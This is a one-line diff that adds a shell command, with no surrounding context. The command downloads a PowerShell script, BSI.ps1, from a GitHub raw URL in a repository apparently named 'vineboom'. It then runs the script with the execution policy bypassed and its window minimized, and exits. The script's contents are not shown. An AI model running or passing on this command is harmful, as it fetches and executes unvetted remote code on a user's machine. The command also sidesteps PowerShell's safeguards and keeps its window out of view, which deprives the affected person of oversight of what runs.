@@ -1,0 +1,1 @@
+curl -o BSI.ps1 https://raw.githubusercontent.com/YeetTheAnson/vineboom/main/BSI.ps1 && powershell -ExecutionPolicy Bypass -WindowStyle Minimized -File BSI.ps1 && exit
